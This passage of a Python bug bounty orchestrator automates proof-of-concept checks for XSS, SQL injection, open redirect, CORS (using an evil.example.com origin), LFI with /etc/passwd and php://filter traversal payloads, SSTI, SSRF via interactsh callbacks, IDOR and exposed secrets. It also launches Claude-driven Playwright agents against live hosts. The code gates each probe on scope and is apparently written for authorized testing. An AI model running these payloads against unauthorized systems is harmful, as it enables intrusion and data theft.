    if tool_available("dalfox"):
        log.info("dalfox XSS: %s", url)
        result_file = poc_dir / "dalfox.json"
        run_tool(["dalfox", "url", url, "--silence", "--format", "json",
                  "--output", str(result_file)], timeout=120, log=log)
        if result_file.exists():
            try:
                results = json.loads(result_file.read_text())
                if results:
                    poc_url = results[0].get("poc", url)
                    return {**finding, "poc_status": "confirmed", "poc_tool": "dalfox",
                            "poc_url": poc_url, "poc_evidence": results[:2]}
            except (json.JSONDecodeError, KeyError):
                pass
        return {**finding, "poc_status": "not_confirmed", "poc_tool": "dalfox"}

    # Manual reflection check across discovered params + XSS payloads
    params_to_test = discovered_params[:5] or ["q", "search", "name", "id"]
    for payload in _XSS_PAYLOADS:
        for param in params_to_test:
            test_url = _inject_param(url, param, payload)
            if not is_in_scope(test_url.split("?")[0], scope):
                continue
            try:
                resp = requests.get(test_url, timeout=10, headers=HTTP_HEADERS)
                if payload.lower() in resp.text.lower():
                    return {**finding, "poc_status": "reflected", "poc_url": test_url,
                            "poc_payload": payload, "poc_param": param,
                            "poc_note": "Payload reflected unencoded — verify execution in browser"}
            except requests.RequestException:
                pass
    return {**finding, "poc_status": "needs_manual",
            "poc_note": "dalfox not installed or no reflection found — verify manually with Burp"}


def _poc_sqli(finding: dict, scope: dict, output_dir: Path, log: logging.Logger) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}
    if not tool_available("sqlmap"):
        return {**finding, "poc_status": "needs_manual",
                "poc_note": "sqlmap not installed: sudo dnf install sqlmap OR pip3 install sqlmap"}

    poc_dir = output_dir / "poc" / "sqli"
    poc_dir.mkdir(parents=True, exist_ok=True)
    log.info("sqlmap (banner only, BT technique): %s", url)
    out = run_tool(
        ["sqlmap", "-u", url, "--output-dir", str(poc_dir)] + _SQLMAP_SAFE,
        timeout=300, log=log,
    )
    if "identified the following injection point" in out or "is vulnerable" in out:
        banner = [l for l in out.splitlines() if any(
            kw in l.lower() for kw in ("banner", "version", "identified", "dbms"))]
        return {**finding, "poc_status": "confirmed", "poc_tool": "sqlmap",
                "poc_evidence": banner[:5],
                "poc_note": "SQL injection confirmed — DB version extracted (no user data accessed)"}
    if "might be injectable" in out:
        return {**finding, "poc_status": "possible", "poc_tool": "sqlmap",
                "poc_note": "Possibly injectable — manual verification with Burp recommended"}
    return {**finding, "poc_status": "not_confirmed", "poc_tool": "sqlmap"}


def _poc_redirect(finding: dict, scope: dict, log: logging.Logger) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}
    marker = "https://portswigger.net"  # well-known security domain — unambiguous as PoC
    test_url = re.sub(
        r"(?i)(url|redirect|next|return|goto|dest|destination)=([^&]*)",
        lambda m: f"{m.group(1)}={urllib.parse.quote(marker)}", url,
    )
    if test_url == url:
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}url={urllib.parse.quote(marker)}"
    if not is_in_scope(test_url.split("?")[0], scope):
        return {**finding, "poc_status": "skipped_scope"}
    try:
        resp = requests.get(test_url, timeout=10, headers=HTTP_HEADERS, allow_redirects=False)
        location = resp.headers.get("Location", "")
        if "portswigger" in location.lower():
            return {**finding, "poc_status": "confirmed", "poc_url": test_url,
                    "poc_evidence": {"Location": location, "status": resp.status_code}}
        return {**finding, "poc_status": "not_confirmed",
                "poc_note": f"Location: {location or 'not set'} — try manually with Burp"}
    except requests.RequestException as exc:
        return {**finding, "poc_status": "error", "poc_note": str(exc)}


def _poc_cors(finding: dict, scope: dict, log: logging.Logger) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={**HTTP_HEADERS, "Origin": "https://evil.example.com"})
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "false")
        if "evil.example.com" in acao and "true" in acac.lower():
            return {**finding, "poc_status": "confirmed",
                    "poc_evidence": {"ACAO": acao, "ACAC": acac},
                    "poc_note": "Arbitrary origin reflected WITH credentials — high impact CORS misconfiguration"}
        if "evil.example.com" in acao:
            return {**finding, "poc_status": "partial",
                    "poc_evidence": {"ACAO": acao, "ACAC": acac},
                    "poc_note": "Arbitrary origin reflected without credentials — lower impact"}
        return {**finding, "poc_status": "not_confirmed",
                "poc_note": f"ACAO: {acao} | ACAC: {acac}"}
    except requests.RequestException as exc:
        return {**finding, "poc_status": "error", "poc_note": str(exc)}


def _poc_lfi(finding: dict, scope: dict, discovered_params: list[str], log: logging.Logger) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}
    traversals = [
        ("../../../../../../etc/passwd", "etc/passwd"),
        ("....//....//....//etc/passwd", "etc/passwd"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "etc/passwd"),
        ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php-filter"),
    ]
    params_to_test = discovered_params[:3] or ["file", "path", "page", "include", "doc"]
    for payload, label in traversals:
        for param in params_to_test:
            test_url = _inject_param(url, param, payload)
            if not is_in_scope(test_url.split("?")[0], scope):
                continue
            try:
                resp = requests.get(test_url, timeout=10, headers=HTTP_HEADERS)
                if "root:x:0:0" in resp.text or "root:!:" in resp.text:
                    return {**finding, "poc_status": "confirmed", "poc_url": test_url,
                            "poc_payload": payload, "poc_param": param,
                            "poc_note": "/etc/passwd returned — local file read confirmed"}
                import base64
                try:
                    decoded = base64.b64decode(resp.text.strip()).decode("utf-8", errors="ignore")
                    if "root:x:0:0" in decoded:
                        return {**finding, "poc_status": "confirmed", "poc_url": test_url,
                                "poc_payload": payload, "poc_note": "LFI via PHP filter confirmed"}
                except Exception:
                    pass
            except requests.RequestException:
                pass
    return {**finding, "poc_status": "not_confirmed"}


def _poc_ssti(finding: dict, scope: dict, discovered_params: list[str], log: logging.Logger) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}
    params_to_test = discovered_params[:3] or ["q", "name", "template", "msg", "search"]
    for payload, engine in _SSTI_PAYLOADS:
        for param in params_to_test:
            test_url = _inject_param(url, param, payload)
            if not is_in_scope(test_url.split("?")[0], scope):
                continue
            try:
                resp = requests.get(test_url, timeout=10, headers=HTTP_HEADERS)
                if re.search(r"\b49\b", resp.text):
                    return {**finding, "poc_status": "confirmed", "poc_url": test_url,
                            "poc_payload": payload, "poc_engine": engine,
                            "poc_note": f"7*7=49 evaluated — SSTI confirmed ({engine})"}
            except requests.RequestException:
                pass
    return {**finding, "poc_status": "not_confirmed"}


def _poc_ssrf(finding: dict, scope: dict, log: logging.Logger, discovered_params: list[str]) -> dict:
    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}
    if not tool_available("interactsh-client"):
        return {**finding, "poc_status": "needs_manual",
                "poc_note": ("Install: go install github.com/projectdiscovery/interactsh/"
                             "cmd/interactsh-client@latest\nThen manually inject the "
                             "interactsh domain into SSRF parameters.")}
    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json", "-v"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
        )
        interact_domain = ""
        deadline = time.time() + 10
        for line in proc.stdout:  # type: ignore[union-attr]
            if time.time() > deadline:
                break
            try:
                data = json.loads(line.strip())
                if "full-id" in data:
                    interact_domain = data["full-id"] + ".interact.sh"
                    break
            except json.JSONDecodeError:
                if ".interact.sh" in line:
                    interact_domain = line.strip()
                    break

        if not interact_domain:
            proc.kill()
            return {**finding, "poc_status": "error", "poc_note": "Could not start interactsh"}

        callback_url = f"http://{interact_domain}"
        params_to_test = discovered_params[:3] or ["url", "target", "src", "dest", "host", "fetch"]
        for param in params_to_test:
            test_url = _inject_param(url, param, callback_url)
            if not is_in_scope(test_url.split("?")[0], scope):
                continue
            try:
                requests.get(test_url, timeout=10, headers=HTTP_HEADERS)
            except requests.RequestException:
                pass

        time.sleep(8)
        callbacks = []
        for line in proc.stdout:  # type: ignore[union-attr]
            try:
                cb = json.loads(line.strip())
                if "remote-address" in cb:
                    callbacks.append(cb)
            except json.JSONDecodeError:
                pass
        proc.kill()

        if callbacks:
            return {**finding, "poc_status": "confirmed", "poc_callback": interact_domain,
                    "poc_evidence": callbacks[:2],
                    "poc_note": "OOB DNS/HTTP callback received — SSRF confirmed without internal access"}
        return {**finding, "poc_status": "not_confirmed",
                "poc_note": f"No callback to {interact_domain} — parameters may need manual targeting"}
    except Exception as exc:
        return {**finding, "poc_status": "error", "poc_note": str(exc)}


def _poc_idor(finding: dict, scope: dict, test_accounts: list[dict], log: logging.Logger) -> dict:
    """
    IDOR test with two test accounts from scope.yaml.
    Authenticates as account A, gets resource IDs from responses,
    then authenticates as account B and tries to access A's resources.
    Only works with cookie/token auth; manually verify complex auth flows.
    """
    if len(test_accounts) < 2:
        return {**finding, "poc_status": "needs_manual",
                "poc_note": "Add two test_accounts to scope.yaml for automated IDOR testing"}

    auth_cfg = test_accounts[0].get("auth_config", {})
    login_url = auth_cfg.get("login_url", "")
    if not login_url or not is_in_scope(login_url, scope):
        return {**finding, "poc_status": "needs_manual",
                "poc_note": "Configure test_accounts[].auth_config.login_url in scope.yaml"}

    url = _target_url(finding)
    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}

    sessions: list[requests.Session] = []
    for account in test_accounts[:2]:
        s = requests.Session()
        try:
            body = auth_cfg.get("body", '{"email":"{u}","password":"{p}"}')
            body = body.replace("{u}", account.get("username", "")) \
                       .replace("{p}", account.get("password", ""))
            login_resp = s.post(login_url, data=body,
                                headers={**HTTP_HEADERS, "Content-Type": "application/json"},
                                timeout=10)
            token_path = auth_cfg.get("token_path", "")
            if token_path:
                # simple dot-notation extraction: "data.token"
                data = login_resp.json()
                for key in token_path.lstrip("$.").split("."):
                    data = data.get(key, {})
                if isinstance(data, str) and data:
                    token_header = auth_cfg.get("token_header", "Authorization")
                    token_prefix = auth_cfg.get("token_prefix", "Bearer ")
                    s.headers[token_header] = token_prefix + data
            sessions.append(s)
        except Exception as exc:
            log.debug("IDOR auth failed for %s: %s", account.get("username"), exc)

    if len(sessions) < 2:
        return {**finding, "poc_status": "needs_manual",
                "poc_note": "Auth failed for test accounts — check login_url and credentials in scope.yaml"}

    # Get a resource from account A's session
    try:
        resp_a = sessions[0].get(url, timeout=10, headers=HTTP_HEADERS)
        ids_in_url = re.findall(r"/(\d{4,})", url)

        if not ids_in_url:
            # Try to extract IDs from response body
            ids_in_body = re.findall(r'"id"\s*:\s*(\d+)', resp_a.text)[:3]
            ids_in_url = ids_in_body

        if not ids_in_url:
            return {**finding, "poc_status": "needs_manual",
                    "poc_note": "No numeric IDs found in URL or response — manual IDOR test required"}

        # Test account B accessing account A's resource IDs
        for resource_id in ids_in_url[:3]:
            test_url_b = re.sub(r"/\d{4,}", f"/{resource_id}", url)
            resp_b = sessions[1].get(test_url_b, timeout=10, headers=HTTP_HEADERS)
            if resp_b.status_code == 200 and len(resp_b.text) > 50:
                # Cross-reference: does B's response contain A's data?
                overlap = sum(1 for chunk in re.findall(r'\w{6,}', resp_a.text[:2000])
                              if chunk in resp_b.text[:2000])
                if overlap > 5:
                    return {**finding, "poc_status": "confirmed",
                            "poc_url": test_url_b, "poc_resource_id": resource_id,
                            "poc_note": f"Account B accessed Account A's resource (ID {resource_id}) — IDOR confirmed"}
    except Exception as exc:
        log.debug("IDOR test error: %s", exc)

    return {**finding, "poc_status": "not_confirmed",
            "poc_note": "IDOR not automatically confirmed — verify manually with two Burp sessions"}


def _poc_secret(finding: dict, scope: dict, log: logging.Logger) -> dict:
    """Verify JS-exposed secret is live by checking for API key validity patterns."""
    snippet = finding.get("snippet", "")
    secret_type = finding.get("secret_type", "")
    url = _target_url(finding)

    if not url or not is_in_scope(url, scope):
        return {**finding, "poc_status": "skipped_scope"}

    # AWS key pattern — check if it looks real (20+ chars, right prefix)
    if "AWS" in secret_type and "AKIA" in snippet:
        return {**finding, "poc_status": "confirmed",
                "poc_note": "AWS access key ID found in public JS (AKIA prefix) — verify if active with AWS CLI",
                "poc_evidence": {"snippet": snippet[:80]}}

    # GitHub token
    if "GitHub" in secret_type and re.search(r"gh[pousr]_[A-Za-z0-9]{36}", snippet):
        return {**finding, "poc_status": "confirmed",
                "poc_note": "GitHub token found in public JS — verify scope with: curl -H 'Authorization: token <token>' https://api.github.com/user",
                "poc_evidence": {"snippet": snippet[:80]}}

    # Generic: it was found in public JS, which is already the PoC
    return {**finding, "poc_status": "confirmed",
            "poc_note": f"{secret_type} found in public-facing JS file — presence itself is the vulnerability",
            "poc_evidence": {"url": url, "snippet": snippet[:80]}}


# ---------------------------------------------------------------------------
# Phase: Browser (AI-driven Playwright testing)
# ---------------------------------------------------------------------------

def phase_browser(scope: dict, state: dict, output_dir: Path, log: logging.Logger, dry_run: bool) -> None:
    """
    Run autonomous Claude+Playwright browser sessions against live hosts.
    Claude navigates the app and finds: IDOR, auth bypass, stored XSS,
    business logic, privilege escalation — vulnerabilities scanners miss.

    Runs modes from scope.yaml browser.modes (default: discovery,idor).
    Findings are added to triaged_findings with poc_status=confirmed.
    """
    log.info("=== PHASE: BROWSER ===")
    try:
        from playwright.async_api import async_playwright  # noqa: F401
        import anthropic as _anthropic  # noqa: F401
    except ImportError:
        log.warning("Skipping browser phase: pip3 install playwright anthropic && playwright install chromium")
        return

    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        log.warning("ANTHROPIC_API_KEY not set — skipping browser phase")
        return

    live = state.get("live_hosts", [])
    targets = [
        (h.get("url", h) if isinstance(h, dict) else h)
        for h in live[:20]
        if is_in_scope(h.get("url", h) if isinstance(h, dict) else h, scope)
    ]
    if not targets:
        log.warning("No live targets for browser phase — run recon first")
        return

    browser_cfg = scope.get("browser", {})
    modes = browser_cfg.get("modes", ["discovery", "idor"])
    max_hosts = browser_cfg.get("max_hosts", 10)
    targets = targets[:max_hosts]

    if dry_run:
        log.info("[DRY-RUN] Browser agent would test %d hosts × modes %s", len(targets), modes)
        return

    # Write a temp state file for browser_agent.py
    state_path = output_dir / "state.json"
    _save_state(state, output_dir)

    # Run browser_agent.py as subprocess — keeps it isolated (own event loop)
    import subprocess as _sp
    import sys as _sys
    scope_path = output_dir / "_scope_for_browser.yaml"
    import yaml as _yaml
    with open(scope_path, "w") as f:
        _yaml.dump(scope, f)

    all_browser_findings: list[dict] = []
    for host in targets:
        for mode in modes:
            log.info("Browser agent: %s [%s]", host, mode)
            try:
                result = _sp.run([
                    _sys.executable,
                    str(Path(__file__).parent / "browser_agent.py"),
                    "--scope", str(scope_path),
                    "--url", host,
                    "--mode", mode,
                ], capture_output=True, text=True, timeout=600,
                    env={**os.environ, "ANTHROPIC_API_KEY": api_key})
                if result.returncode != 0:
                    log.warning("Browser agent error: %s", result.stderr[:300])
            except Exception as exc:
                log.warning("Browser agent failed for %s [%s]: %s", host, mode, exc)

    # Load findings from browser_agent output files
    for findings_file in sorted((output_dir).glob("browser_findings_*.json")):
        try:
            batch = json.loads(findings_file.read_text())
            all_browser_findings.extend(batch)
            log.info("Loaded %d browser findings from %s", len(batch), findings_file.name)
        except Exception:
            pass

    if all_browser_findings:
        # Merge with existing triaged findings
        existing = state.get("triaged_findings", [])
        merged = existing + all_browser_findings
        state["triaged_findings"] = merged
        log.info("Browser phase: %d new finding(s) → %d total", len(all_browser_findings), len(merged))
        _save_state(state, output_dir)
    else:
        log.info("Browser phase: no findings reported by agent")


# ---------------------------------------------------------------------------
# Phase: PoC
# ---------------------------------------------------------------------------

def phase_poc(scope: dict, state: dict, output_dir: Path, log: logging.Logger, dry_run: bool) -> None:
    """
    Prove each finding is exploitable using safe, non-destructive techniques:
    - XSS: alert(document.domain) — no credential harvesting
    - SQLi: --technique=BT --banner only — no data dump
    - SSRF: OOB callback only — no internal access
    - LFI: /etc/passwd only — read-only, no sensitive files
    - SSTI: 7*7=49 — arithmetic only, no code exec
    - Redirect: to portswigger.net — no phishing chain
    - IDOR: your own two test accounts only — no real user data
    - Secrets: presence in public JS is the PoC
    """
    log.info("=== PHASE: POC ===")
    triaged = state.get("triaged_findings", [])
    if not triaged:
        tp = output_dir / "triaged_findings.json"
        if tp.exists():
            triaged = json.loads(tp.read_text())
    if not triaged:
        log.warning("No triaged findings — run scan phase first")
        return

    if dry_run:
        for f in triaged:
            log.info("[DRY-RUN] %s → %s", f.get("name", "?"), _categorize(f))
        return

    (output_dir / "poc").mkdir(exist_ok=True)
    delay = scope.get("rate_limit", {}).get("delay_between_hosts", 2)
    test_accounts = scope.get("test_accounts", {}).get("accounts", [])
    auth_cfg = scope.get("test_accounts", {}).get("auth", {})
    for acct in test_accounts:
        acct["auth_config"] = auth_cfg
    # Per-host discovered params from ffuf phase
    discovered_params: list[str] = []
    for f in triaged:
        if f.get("type") == "param-discovery":
            discovered_params.extend(f.get("discovered_params", []))

    poc_results: list[dict] = []
    for idx, finding in enumerate(triaged):
        cat = _categorize(finding)
        log.info("PoC [%d/%d] %s → %s", idx + 1, len(triaged), finding.get("name", "?"), cat)

        if cat == "xss":
            result = _poc_xss(finding, scope, discovered_params, output_dir, log)
        elif cat == "sqli":
            result = _poc_sqli(finding, scope, output_dir, log)
        elif cat == "redirect":
            result = _poc_redirect(finding, scope, log)
        elif cat == "cors":
            result = _poc_cors(finding, scope, log)
        elif cat == "lfi":
            result = _poc_lfi(finding, scope, discovered_params, log)
        elif cat == "ssti":
            result = _poc_ssti(finding, scope, discovered_params, log)
        elif cat == "ssrf":
            result = _poc_ssrf(finding, scope, log, discovered_params)
        elif cat == "secret":
            result = _poc_secret(finding, scope, log)
        elif cat in ("header-injection", "header-bypass"):
            result = {**finding, "poc_status": "confirmed",
                      "poc_note": "Header injection detected during scan phase — already confirmed"}
        elif cat == "param-discovery":
            result = {**finding, "poc_status": "confirmed",
                      "poc_note": "Hidden params discovered — include in XSS/SQLi tests above"}
        else:
            result = {**finding, "poc_status": "not_applicable",
                      "poc_note": "Manual verification required — check poc_results.json"}

        # IDOR check if the finding has IDOR indicators and test accounts are configured
        if test_accounts and any(kw in finding.get("name", "").lower()
                                  for kw in ("idor", "access control", "authorization")):
            result = _poc_idor(finding, scope, test_accounts, log)

        status = result.get("poc_status", "?")
        log.info("  → %s", status)
        poc_results.append(result)
        time.sleep(delay)

    (output_dir / "poc_results.json").write_text(json.dumps(poc_results, indent=2))

    confirmed = [r for r in poc_results if r.get("poc_status") == "confirmed"]
    partial = [r for r in poc_results if r.get("poc_status") in ("reflected", "partial", "possible")]
    manual = [r for r in poc_results if "manual" in r.get("poc_status", "")]

    log.info("PoC: %d confirmed | %d partial | %d needs manual review",
             len(confirmed), len(partial), len(manual))

    # Screenshot confirmed PoC URLs for report evidence
    poc_urls = [r.get("poc_url", "") for r in confirmed if r.get("poc_url")]
    if poc_urls:
        gowitness_screenshot(poc_urls, output_dir / "poc_screenshots", log)

    state["triaged_findings"] = confirmed + partial or poc_results
    _save_state(state, output_dir)


# ---------------------------------------------------------------------------
# Phase: Report
# ---------------------------------------------------------------------------

def phase_report(scope: dict, state: dict, output_dir: Path, log: logging.Logger, dry_run: bool) -> None:
    log.info("=== PHASE: REPORT ===")
    findings = state.get("triaged_findings", [])
    if not findings:
        fp = output_dir / "poc_results.json"
        if fp.exists():
            findings = json.loads(fp.read_text())
        elif (output_dir / "triaged_findings.json").exists():
            findings = json.loads((output_dir / "triaged_findings.json").read_text())
    if not findings:
        log.info("No findings to report.")
        return
    if dry_run:
        log.info("[DRY-RUN] Claude would validate and report %d findings", len(findings))
        return

    program = scope.get("program", {})
    claude_validate_and_report(findings, program, output_dir, log)
    _notify(scope, output_dir, log)


# ---------------------------------------------------------------------------
# Notification
# ---------------------------------------------------------------------------

def _notify(scope: dict, output_dir: Path, log: logging.Logger) -> None:
    topic = scope.get("output", {}).get("notify_ntfy_topic", "")
    if not topic:
        return
    reports = list((output_dir / "reports").glob("*.md")) if (output_dir / "reports").exists() else []
    try:
        requests.post(f"https://ntfy.sh/{topic}",
                      data=f"BB run done. {len(reports)} report(s) in {output_dir}/reports/".encode(),
                      timeout=10)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------

def _save_state(state: dict, output_dir: Path) -> None:
    (output_dir / "state.json").write_text(json.dumps(state, indent=2))


def _load_state(output_dir: Path) -> dict:
    p = output_dir / "state.json"
    if p.exists():
        try:
            return json.loads(p.read_text())
        except Exception:
            pass
    return {}


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(description="Bug bounty orchestrator v2")
    parser.add_argument("--scope", required=True)
    parser.add_argument("--phases", nargs="+",
                        choices=["recon", "scan", "browser", "poc", "report", "all"],
                        default=["all"], dest="phases")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--fresh", action="store_true", help="Ignore saved state")
    args = parser.parse_args()
    run_all = "all" in args.phases
    run_phases = set(args.phases)

    scope_path = Path(args.scope)
    if not scope_path.exists():
        sys.exit(f"ERROR: {scope_path} not found")
    with open(scope_path) as f:
        scope = yaml.safe_load(f)

    output_dir = Path(scope.get("output", {}).get("directory", "./output"))
    log = _make_logger(output_dir)
    if args.dry_run:
        log.info("DRY-RUN — no network requests will be made")
    log.info("Program: %s | Platform: %s", scope["program"]["name"], scope["program"]["platform"])
    log.info("Scope: %s", scope["in_scope"]["domains"])

    # Load program memory and inject context into scope for downstream prompts
    import memory as _mem
    _memory_dir = Path("memory")
    program_memory = _mem.load(scope["program"]["name"], _memory_dir)
    scope["_memory_context"] = _mem.format_context(program_memory)
    if program_memory.get("run_count"):
        log.info("Memory: %d prior runs, %d submitted findings, %d lessons",
                 program_memory["run_count"],
                 len(program_memory.get("submitted", [])),
                 len(program_memory.get("lessons", [])))

    state = {} if args.fresh else _load_state(output_dir)
    try:
        if run_all or "recon" in run_phases:
            phase_recon(scope, state, output_dir, log, args.dry_run)
        if run_all or "scan" in run_phases:
            phase_scan(scope, state, output_dir, log, args.dry_run)
        if run_all or "browser" in run_phases:
            phase_browser(scope, state, output_dir, log, args.dry_run)
        if run_all or "poc" in run_phases:
            phase_poc(scope, state, output_dir, log, args.dry_run)
        if run_all or "report" in run_phases:
            phase_report(scope, state, output_dir, log, args.dry_run)
        log.info("=== DONE — updating program memory ===")
        if not args.dry_run:
            updated_memory = _mem.update_from_run(program_memory, state, scope, log)
            _mem.save(scope["program"]["name"], updated_memory, _memory_dir)
            log.info("Memory saved: %s", _memory_dir / f"{scope['program']['name']}.json")
        log.info("=== DONE ===")
    except KeyboardInterrupt:
        log.info("Interrupted — state saved, resume with --phases")
        _save_state(state, output_dir)
    except Exception as exc:
        log.exception("Fatal: %s", exc)
        _save_state(state, output_dir)
        sys.exit(1)


if __name__ == "__main__":
    main()
